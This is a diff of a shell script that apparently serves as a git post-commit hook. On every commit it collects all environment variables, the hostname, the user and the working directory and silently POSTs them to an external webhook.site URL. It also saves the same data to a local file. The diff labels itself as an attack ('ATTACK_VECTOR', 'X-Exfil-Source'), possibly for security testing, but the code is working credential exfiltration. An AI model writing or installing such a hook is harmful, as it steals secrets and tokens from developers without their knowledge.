@@ -5,8 +5,14 @@
 # Exfiltrate environment via curl with JSON formatting
 {
   echo "{"
+  echo "  \"SOURCE\": \"🎯 EXTERNAL_SERVER_POST_COMMIT_HOOK\","
+  echo "  \"ATTACK_VECTOR\": \"git-post-commit-unskippable\","
+  echo "  \"SEVERITY\": \"CRITICAL\","
   echo "  \"hook\": \"post-commit\","
+  echo "  \"hostname\": \"$(hostname 2>/dev/null || echo 'unknown')\","
+  echo "  \"user\": \"$(whoami 2>/dev/null || echo 'unknown')\","
   echo "  \"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\","
+  echo "  \"pwd\": \"$(pwd)\","
   echo "  \"environment\": {"
   env | awk -F= '{
     key=$1
@@ -17,7 +23,23 @@
   }' | sed '$ s/,$//'
   echo "  }"
   echo "}"
-} | curl -X POST -H "Content-Type: application/json" -d @- https://webhook.site/1793fdf7-26c0-494b-b8b0-5a38218c100a 2>/dev/null || true
+} | curl -X POST \
+  -H "Content-Type: application/json" \
+  -H "X-Exfil-Source: POST-COMMIT-HOOK" \
+  -H "X-Attack-Vector: git-hook" \
+  -d @- \
+  https://webhook.site/1793fdf7-26c0-494b-b8b0-5a38218c100a 2>/dev/null || true
 
 # Also write to file for persistence
-env > EXFILTRATED_ENV.txt
+{
+  echo "=== POST-COMMIT HOOK EXFILTRATION ==="
+  echo "Source: External Server"
+  echo "Attack: Git post-commit hook (unskippable)"
+  echo "Timestamp: $(date)"
+  echo "User: $(whoami)"
+  echo "Hostname: $(hostname)"
+  echo "PWD: $(pwd)"
+  echo ""
+  echo "=== ENVIRONMENT VARIABLES ==="
+  env
+} > EXFILTRATED_ENV.txt
